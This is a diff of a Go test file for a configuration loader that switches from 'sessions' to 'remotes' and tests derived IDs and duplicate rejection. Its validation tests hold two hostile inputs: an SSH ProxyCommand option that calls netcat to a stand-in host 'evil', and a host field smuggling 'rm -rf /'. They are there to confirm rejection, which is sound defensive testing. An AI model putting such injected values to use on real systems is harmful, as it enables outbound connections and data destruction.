@@ -19,27 +19,48 @@ func TestLoadValid(t *testing.T) {
 	p := writeCfg(t, `
 otp_secret: "JBSWY3DPEHPK3PXP"
 display_name: "Tester"
-sessions:
-  - id: local
-    type: local
-    name: "Local"
-  - id: gpu01
-    type: ssh
-    name: "GPU"
-    host: "gpu01.internal"
+remotes:
+  - host: "gpu01.internal"
     user: "deploy"
     port: 22
     ssh_options: ["-o", "ServerAliveInterval=30"]
+  - name: "Box 2"
+    host: "10.0.0.5"
 `)
 	cfg, err := Load(p)
 	if err != nil {
 		t.Fatalf("Load: %v", err)
 	}
-	if len(cfg.Sessions) != 2 {
-		t.Fatalf("want 2 sessions, got %d", len(cfg.Sessions))
+	if len(cfg.Remotes) != 2 {
+		t.Fatalf("want 2 remotes, got %d", len(cfg.Remotes))
 	}
-	if _, ok := cfg.Find("gpu01"); !ok {
-		t.Fatal("Find gpu01 failed")
+	// id derived from host, name defaulted to host.
+	r, ok := cfg.FindRemote("gpu01_internal")
+	if !ok {
+		t.Fatalf("FindRemote(gpu01_internal) failed; ids: %+v", cfg.Remotes)
+	}
+	if r.Name != "gpu01.internal" {
+		t.Fatalf("default name = %q, want host", r.Name)
+	}
+	// IP host slugified.
+	if _, ok := cfg.FindRemote("10_0_0_5"); !ok {
+		t.Fatal("FindRemote(10_0_0_5) failed")
+	}
+}
+
+func TestExplicitIDOverride(t *testing.T) {
+	p := writeCfg(t, `
+otp_secret: "JBSWY3DPEHPK3PXP"
+remotes:
+  - id: gpu
+    host: "gpu01.internal"
+`)
+	cfg, err := Load(p)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, ok := cfg.FindRemote("gpu"); !ok {
+		t.Fatal("explicit id override not honored")
 	}
 }
 
@@ -51,7 +72,7 @@ func TestNoConfig(t *testing.T) {
 }
 
 func TestRejectBadOTP(t *testing.T) {
-	p := writeCfg(t, "otp_secret: \"not base32 !!!\"\nsessions: []\n")
+	p := writeCfg(t, "otp_secret: \"not base32 !!!\"\nremotes: []\n")
 	if _, err := Load(p); err == nil {
 		t.Fatal("expected error for bad otp_secret")
 	}
@@ -60,10 +81,8 @@ func TestRejectBadOTP(t *testing.T) {
 func TestRejectDangerousSSHOption(t *testing.T) {
 	p := writeCfg(t, `
 otp_secret: "JBSWY3DPEHPK3PXP"
-sessions:
-  - id: bad
-    type: ssh
-    host: "h"
+remotes:
+  - host: "h"
     ssh_options: ["-o", "ProxyCommand=nc evil 1"]
 `)
 	if _, err := Load(p); err == nil {
@@ -74,24 +93,22 @@ sessions:
 func TestRejectBadHost(t *testing.T) {
 	p := writeCfg(t, `
 otp_secret: "JBSWY3DPEHPK3PXP"
-sessions:
-  - id: bad
-    type: ssh
-    host: "h; rm -rf /"
+remotes:
+  - host: "h; rm -rf /"
 `)
 	if _, err := Load(p); err == nil {
 		t.Fatal("expected bad host to be rejected")
 	}
 }
 
-func TestRejectBadID(t *testing.T) {
+func TestRejectDuplicateDerivedID(t *testing.T) {
 	p := writeCfg(t, `
 otp_secret: "JBSWY3DPEHPK3PXP"
-sessions:
-  - id: "bad id"
-    type: local
+remotes:
+  - host: "same.host"
+  - host: "same.host"
 `)
 	if _, err := Load(p); err == nil {
-		t.Fatal("expected bad id to be rejected")
+		t.Fatal("expected duplicate derived id to be rejected")
 	}
 }
